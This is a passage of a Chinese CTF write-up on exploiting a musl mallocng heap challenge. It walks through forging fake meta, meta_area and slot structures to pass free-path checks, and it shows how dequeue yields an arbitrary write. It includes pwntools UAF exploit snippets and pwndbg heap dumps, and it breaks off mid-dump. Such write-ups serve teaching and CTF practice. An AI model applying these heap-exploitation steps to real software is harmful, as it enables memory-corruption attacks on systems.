class=\"number\">4</span> = &#123;</span><br><span class=\"line\">  meta = <span class=\"number\">0x55555730d4f0</span>, </span><br><span class=\"line\">  active_idx = <span class=\"number\">9</span> <span class=\"string\">&#x27;\\t&#x27;</span>, </span><br><span class=\"line\">  pad = <span class=\"string\">&quot;\\000\\000\\000\\000\\200\\000&quot;</span>, </span><br><span class=\"line\">  storage = <span class=\"number\">0x7f6431216c40</span> <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>然后，3 这，他也只想一个地址，这里你也是一个 meta，与后面 group 的 free 有关。</p>\n<p>slot 的堆头会保留与 base 的偏移，以及 slot 在 group 组的编号，通过偏移找到 base，也就是 group 的地址。</p>\n<p>下面我们来说检查，要想把 fake_meta 释放掉，要保证 meta 只有一个 freeadble, 可以是只有 1 个 slot，也可以是其他状况，因为这个会涉及 meta 的 avail_mask 以及 freed_mask，我建议是把 freed_mask 写成 0，这样在 free 函数里的一个循环时，直接跳出，减少工作量。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// atomic free without locking if this is neither first or last slot</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> (;;) &#123;</span><br><span class=\"line\">\t<span class=\"type\">uint32_t</span> freed = g-&gt;freed_mask;</span><br><span class=\"line\">\t<span class=\"type\">uint32_t</span> avail = g-&gt;avail_mask;</span><br><span class=\"line\">\t<span class=\"type\">uint32_t</span> mask = freed | avail;</span><br><span class=\"line\">\tassert(!(mask&amp;self));</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!freed || mask+self==all) <span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!MT)</span><br><span class=\"line\">\t\tg-&gt;freed_mask = freed+self;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (a_cas(&amp;g-&gt;freed_mask, freed, freed+self)!=freed)</span><br><span class=\"line\">\t\t<span class=\"keyword\">continue</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>上面提到的根据用户指针找到对应的 meta，在 free 函数里被封装在 get_meta () 函数里，这里也是我们的第一个检查。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"keyword\">inline</span> <span class=\"keyword\">struct</span> meta *<span class=\"title function_\">get_meta</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *p)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tassert(!((<span class=\"type\">uintptr_t</span>)p &amp; <span class=\"number\">15</span>));</span><br><span class=\"line\">\t<span class=\"type\">int</span> offset = *(<span class=\"type\">const</span> <span class=\"type\">uint16_t</span> *)(p - <span class=\"number\">2</span>);</span><br><span class=\"line\">\t<span class=\"type\">int</span> index = get_slot_index(p);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (p[<span class=\"number\">-4</span>]) &#123;</span><br><span class=\"line\">\t\tassert(!offset);</span><br><span class=\"line\">\t\toffset = *(<span class=\"type\">uint32_t</span> *)(p - <span class=\"number\">8</span>);</span><br><span class=\"line\">\t\tassert(offset &gt; <span class=\"number\">0xffff</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"type\">const</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">group</span> *<span class=\"title\">base</span> =</span> (<span class=\"type\">const</span> <span class=\"type\">void</span> *)(p - UNIT*offset - UNIT);\t\t\t\t\t\t<span class=\"comment\">//UNIT = 16</span></span><br><span class=\"line\">\t<span class=\"type\">const</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">meta</span> *<span class=\"title\">meta</span> =</span> base-&gt;meta;</span><br><span class=\"line\">\tassert(meta-&gt;mem == base);</span><br><span class=\"line\">\tassert(index &lt;= meta-&gt;last_idx);</span><br><span class=\"line\">\tassert(!(meta-&gt;avail_mask &amp; (<span class=\"number\">1u</span>&lt;&lt;index)));</span><br><span class=\"line\">\tassert(!(meta-&gt;freed_mask &amp; (<span class=\"number\">1u</span>&lt;&lt;index)));</span><br><span class=\"line\">\t<span class=\"type\">const</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">meta_area</span> *<span class=\"title\">area</span> =</span> (<span class=\"type\">void</span> *)((<span class=\"type\">uintptr_t</span>)meta &amp; <span class=\"number\">-4096</span>);</span><br><span class=\"line\">\tassert(area-&gt;check == ctx.secret);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (meta-&gt;sizeclass &lt; <span class=\"number\">48</span>) &#123;</span><br><span class=\"line\">\t\tassert(offset &gt;= size_classes[meta-&gt;sizeclass]*index);</span><br><span class=\"line\">\t\tassert(offset &lt; size_classes[meta-&gt;sizeclass]*(index+<span class=\"number\">1</span>));</span><br><span class=\"line\">\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\tassert(meta-&gt;sizeclass == <span class=\"number\">63</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (meta-&gt;maplen) &#123;</span><br><span class=\"line\">\t\tassert(offset &lt;= meta-&gt;maplen*<span class=\"number\">4096UL</span>/UNIT - <span class=\"number\">1</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (<span class=\"keyword\">struct</span> meta *)meta;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>一些 offset，idx 的设置其实有相关的计算方式，但是为了方便，我们伪造的之前，可以把利用程序做一个真实的对布局，然后直接把 group，meta 的结构体中的使用位的参数复制出来。这样就可以很方便的跳过检查。我们将 fake 伪造在一个大的堆块上，fake 会根据 const struct meta *meta = base-&gt;meta; 来查询到，下面我们还要伪造一个 meta_area 结构体，这个结构体保留了__malloc_context 的 secret，然后这个 area 是 0x1000 字节对齐的，const struct meta_area *area = (void *)((uintptr_t) meta &amp; -4096);，这个跟我们的 fake_meta 的地址是相关联的，所以我们需要在一个 0x1000 字节对齐的地方布置一个 fake_meta_area, 主要就是把 secret 写进去，绕过检查。这里并不会检查 meta 的 prev 以及 next 是否合法，所以这里有一个任意地址的写。把 prev 地址 + 8 写为 next 的值。释放 slot 的检查基本就结束，因为我们伪造的 slot 的头，以及 fake_meta 都是真实的样子，然后还有一个关键的检查是在 dequeue (unlink) 之后 free_group，这里会将 group 指针作为一个 slot 指针，进行 free。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"keyword\">struct</span> mapinfo <span class=\"title function_\">nontrivial_free</span><span class=\"params\">(<span class=\"keyword\">struct</span> meta *g, <span class=\"type\">int</span> i)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">uint32_t</span> self = <span class=\"number\">1u</span>&lt;&lt;i;</span><br><span class=\"line\">\t<span class=\"type\">int</span> sc = g-&gt;sizeclass;</span><br><span class=\"line\">\t<span class=\"type\">uint32_t</span> mask = g-&gt;freed_mask | g-&gt;avail_mask;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (mask+self == (<span class=\"number\">2u</span>&lt;&lt;g-&gt;last_idx)<span class=\"number\">-1</span> &amp;&amp; okay_to_free(g)) &#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">// any multi-slot group is necessarily on an active list</span></span><br><span class=\"line\">\t\t<span class=\"comment\">// here, but single-slot groups might or might not be.</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (g-&gt;next) &#123;</span><br><span class=\"line\">\t\t\tassert(sc &lt; <span class=\"number\">48</span>);</span><br><span class=\"line\">\t\t\t<span class=\"type\">int</span> activate_new = (ctx.active[sc]==g);</span><br><span class=\"line\">\t\t\tdequeue(&amp;ctx.active[sc], g);\t\t\t\t\t<span class=\"comment\">//任意地址写</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (activate_new &amp;&amp; ctx.active[sc])</span><br><span class=\"line\">\t\t\t\tactivate_group(ctx.active[sc]);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> free_group(g);</span><br><span class=\"line\">\t&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (!mask) &#123;</span><br><span class=\"line\">\t\tassert(sc &lt; <span class=\"number\">48</span>);</span><br><span class=\"line\">\t\t<span class=\"comment\">// might still be active if there were no allocations</span></span><br><span class=\"line\">\t\t<span class=\"comment\">// after last available slot was taken.</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (ctx.active[sc] != g) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">queue</span>(&amp;ctx.active[sc], g);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"type\">static</span> <span class=\"keyword\">inline</span> <span class=\"type\">void</span> <span class=\"title function_\">dequeue</span><span class=\"params\">(<span class=\"keyword\">struct</span> meta **phead, <span class=\"keyword\">struct</span> meta *m)</span>\t\t\t\t<span class=\"comment\">//unlink the meta</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (m-&gt;next != m) &#123;\t\t\t\t\t\t\t<span class=\"comment\">//meta is freed</span></span><br><span class=\"line\">\t\tm-&gt;prev-&gt;next = m-&gt;next;</span><br><span class=\"line\">\t\tm-&gt;next-&gt;prev = m-&gt;prev;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (*phead == m) *phead = m-&gt;next;</span><br><span class=\"line\">\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t*phead = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tm-&gt;prev = m-&gt;next = <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>就是我们上面图片的 3 号位置。这个是 group 对应的 meta, 这里利用同样的手段伪造一个 fake_meta_area 以及一个 meta, 只需要在另外一个 0x1000 字节对齐的空间布置下 secret，后面布置 fake_meta2 就可以了。因为这里的检查也主要是 get_meta (). 最后 free_meta ()</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"keyword\">inline</span> <span class=\"type\">void</span> <span class=\"title function_\">free_meta</span><span class=\"params\">(<span class=\"keyword\">struct</span> meta *m)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t*m = (<span class=\"keyword\">struct</span> meta)&#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">\t<span class=\"built_in\">queue</span>(&amp;ctx.free_meta_head, m);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"keyword\">inline</span> <span class=\"type\">void</span> <span class=\"title function_\">queue</span><span class=\"params\">(<span class=\"keyword\">struct</span> meta **phead, <span class=\"keyword\">struct</span> meta *m)</span>\t\t\t\t\t\t</span><br><span class=\"line\">    <span class=\"comment\">//inser m in the front of queue,but it will not change the phead ptr </span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tassert(!m-&gt;next);</span><br><span class=\"line\">\tassert(!m-&gt;prev);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (*phead) &#123;</span><br><span class=\"line\">\t\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">meta</span> *<span class=\"title\">head</span> =</span> *phead;</span><br><span class=\"line\">\t\tm-&gt;next = head;</span><br><span class=\"line\">\t\tm-&gt;prev = head-&gt;prev;</span><br><span class=\"line\">\t\tm-&gt;next-&gt;prev = m-&gt;prev-&gt;next = m;</span><br><span class=\"line\">\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\tm-&gt;prev = m-&gt;next = m;</span><br><span class=\"line\">\t\t*phead = m;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>没有什么其他检查。</p>\n<h4 id=\"利用-2\"><a class=\"markdownIt-Anchor\" href=\"#利用-2\">#</a> 利用</h4>\n<p>回到题目，我们利用 UAF,</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">add(<span class=\"string\">b&#x27;g&#x27;</span>*<span class=\"number\">0x28</span>,<span class=\"string\">b&#x27;g&#x27;</span>*<span class=\"number\">0x28</span>)</span><br><span class=\"line\">add(<span class=\"string\">b&#x27;h&#x27;</span>*<span class=\"number\">0x28</span>,<span class=\"string\">b&#x27;h&#x27;</span>*<span class=\"number\">0x28</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">fakebabynote = p64( <span class=\"number\">0x29fdd0</span> +libcbase)+p64(fakemeta_addr+<span class=\"number\">0x50</span>)+p64(<span class=\"number\">1</span>)+p64(<span class=\"number\">0x28</span>)+p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">add(<span class=\"string\">b&#x27;i&#x27;</span>,fakebabynote)</span><br><span class=\"line\">free(<span class=\"string\">b&#x27;g&#x27;</span>*<span class=\"number\">0x28</span>)</span><br><span class=\"line\">gdb.attach(r)</span><br><span class=\"line\">add(p64(<span class=\"number\">0x29bd00</span>+libcbase)*<span class=\"number\">2</span>+p64(<span class=\"number\">0x8</span>)+p64(<span class=\"number\">0x8</span>)+p64(libcbase+<span class=\"number\">0x29bd90</span>),fake_meta.ljust(<span class=\"number\">0x2000</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">free(<span class=\"string\">b&#x27;b&#x27;</span>)</span><br></pre></td></tr></table></figure>\n<p>group 里的第一个 slot 开始被用作存放 banynote1，next 指针指向 0，babynotelist 头插法之后删掉第一个创建的 babynote，然后堆风水将 slot0（原本作为 babynote）作为 name 或者 note 堆块，可以写入数据，但是因为存在 uaf, 虽然 slot0 作为链表头的 name 或者 note, 但是依旧可以链表的遍历将他看成一个节点，我们还可以将其 next 指针写为我们 kafechunk 的地址，这个 fakechunk 其实是一个 babynote 的 name 或者 note，只是伪造成了 bebynote 的布局，对应 note 之指针指向我们布局好的 fakeslot</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">pwndbg&gt; x/<span class=\"number\">64</span>gx  <span class=\"number\">0x7f22b639fc30</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fc30</span>:\t<span class=\"number\">0x00005555569254f0</span>\t<span class=\"number\">0x0000ff0000000009</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fc40</span>:\t<span class=\"number\">0x00007f22b639fc70</span>\t<span class=\"number\">0x00007f22b639fca0</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fc50</span>:\t<span class=\"number\">0x0000000000000028</span>\t<span class=\"number\">0x0000000000000028</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fc60</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000ff0000000000</span>\t\t\t\t<span class=\"comment\">//下一次申请，这里会被改写</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fc70</span>:\t<span class=\"number\">0x6767676767676767</span>\t<span class=\"number\">0x6767676767676767</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fc80</span>:\t<span class=\"number\">0x6767676767676767</span>\t<span class=\"number\">0x6767676767676767</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fc90</span>:\t<span class=\"number\">0x6767676767676767</span>\t<span class=\"number\">0x0000ff0000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fca0</span>:\t<span class=\"number\">0x6767676767676767</span>\t<span class=\"number\">0x6767676767676767</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fcb0</span>:\t<span class=\"number\">0x6767676767676767</span>\t<span class=\"number\">0x6767676767676767</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fcc0</span>:\t<span class=\"number\">0x6767676767676767</span>\t<span class=\"number\">0x0009830000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fcd0</span>:\t<span class=\"number\">0x00007f22b639fd00</span>\t<span class=\"number\">0x00007f22b639fd30</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fce0</span>:\t<span class=\"number\">0x0000000000000028</span>\t<span class=\"number\">0x0000000000000028</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fcf0</span>:\t<span class=\"number\">0x00007f22b639fc40</span>\t<span class=\"number\">0x000c840000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fd00</span>:\t<span class=\"number\">0x6868686868686868</span>\t<span class=\"number\">0x6868686868686868</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fd10</span>:\t<span class=\"number\">0x6868686868686868</span>\t<span class=\"number\">0x6868686868686868</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fd20</span>:\t<span class=\"number\">0x6868686868686868</span>\t<span class=\"number\">0x000f850000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fd30</span>:\t<span class=\"number\">0x6868686868686868</span>\t<span class=\"number\">0x6868686868686868</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fd40</span>:\t<span class=\"number\">0x6868686868686868</span>\t<span class=\"number\">0x6868686868686868</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fd50</span>:\t<span class=\"number\">0x6868686868686868</span>\t<span class=\"number\">0x0012860000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fd60</span>:\t<span class=\"number\">0x00007f22b63a3e20</span>\t<span class=\"number\">0x00007f22b639fd90</span><span class=\"comment\">//fakebabynote的地址</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fd70</span>:\t<span class=\"number\">0x0000000000000001</span>\t<span class=\"number\">0x0000000000000028</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fd80</span>:\t<span class=\"number\">0x00007f22b639fcd0</span>\t<span class=\"number\">0x0015870000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fd90</span>:\t<span class=\"number\">0x00007f22b63a3dd0</span>\t<span class=\"number\">0x00007f22b6395070</span>\t\t<span class=\"comment\">//fakebabynote,0x00007f22b6395070指向我们伪造的slot</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fda0</span>:\t<span class=\"number\">0x0000000000000001</span>\t<span class=\"number\">0x0000000000000028</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fdb0</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000ff0000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fdc0</span>:\t<span class=\"number\">0x6767676767676767</span>\t<span class=\"number\">0x6767676767676767</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fdd0</span>:\t<span class=\"number\">0x6767676767676767</span>\t<span class=\"number\">0x6767676767676767</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fde0</span>:\t<span class=\"number\">0x6767676767676767</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fdf0</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fe00</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fe10</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fe20</span>:\t<span class=\"number\">0x0000555556925090</span>\t<span class=\"number\">0x0000ff0000000000</span></span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br></pre></td></tr></table></figure>\n<p>我们把 slot 申请成为 name 后</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; x/<span class=\"number\">64</span>gx  <span class=\"number\">0x7f22b639fc30</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fc30</span>:\t<span class=\"number\">0x00005555569254f0</span>\t<span class=\"number\">0x0000800000000009</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fc40</span>:\t<span class=\"number\">0x00007f22b639fd00</span>\t<span class=\"number\">0x00007f22b639fd00</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fc50</span>:\t<span class=\"number\">0x0000000000000008</span>\t<span class=\"number\">0x0000000000000008</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fc60</span>:\t<span class=\"number\">0x00007f22b639fd90</span>\t<span class=\"number\">0x0000ff0000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fc70</span>:\t<span class=\"number\">0x6767676767676767</span>\t<span class=\"number\">0x6767676767676767</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fc80</span>:\t<span class=\"number\">0x6767676767676767</span>\t<span class=\"number\">0x6767676767676767</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fc90</span>:\t<span class=\"number\">0x6767676767676767</span>\t<span class=\"number\">0x0000ff0000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fca0</span>:\t<span class=\"number\">0x6767676767676767</span>\t<span class=\"number\">0x6767676767676767</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fcb0</span>:\t<span class=\"number\">0x6767676767676767</span>\t<span class=\"number\">0x6767676767676767</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fcc0</span>:\t<span class=\"number\">0x6767676767676767</span>\t<span class=\"number\">0x0009830000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fcd0</span>:\t<span class=\"number\">0x00007f22b639fd00</span>\t<span class=\"number\">0x00007f22b639fd30</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fce0</span>:\t<span class=\"number\">0x0000000000000028</span>\t<span class=\"number\">0x0000000000000028</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fcf0</span>:\t<span class=\"number\">0x00007f22b639fc40</span>\t<span class=\"number\">0x000c840000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fd00</span>:\t<span class=\"number\">0x6868686868686868</span>\t<span class=\"number\">0x6868686868686868</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fd10</span>:\t<span class=\"number\">0x6868686868686868</span>\t<span class=\"number\">0x6868686868686868</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fd20</span>:\t<span class=\"number\">0x6868686868686868</span>\t<span class=\"number\">0x000f850000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fd30</span>:\t<span class=\"number\">0x6868686868686868</span>\t<span class=\"number\">0x6868686868686868</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fd40</span>:\t<span class=\"number\">0x6868686868686868</span>\t<span class=\"number\">0x6868686868686868</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fd50</span>:\t<span class=\"number\">0x6868686868686868</span>\t<span class=\"number\">0x0012860000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fd60</span>:\t<span class=\"number\">0x00007f22b63a3e20</span>\t<span class=\"number\">0x00007f22b639fd90</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fd70</span>:\t<span class=\"number\">0x0000000000000001</span>\t<span class=\"number\">0x0000000000000028</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fd80</span>:\t<span class=\"number\">0x00007f22b639fcd0</span>\t<span class=\"number\">0x0015870000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fd90</span>:\t<span class=\"number\">0x00007f22b63a3dd0</span>\t<span class=\"number\">0x00007f22b6395070</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fda0</span>:\t<span class=\"number\">0x0000000000000001</span>\t<span class=\"number\">0x0000000000000028</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fdb0</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000ff0000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fdc0</span>:\t<span class=\"number\">0x6767676767676767</span>\t<span class=\"number\">0x6767676767676767</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fdd0</span>:\t<span class=\"number\">0x6767676767676767</span>\t<span 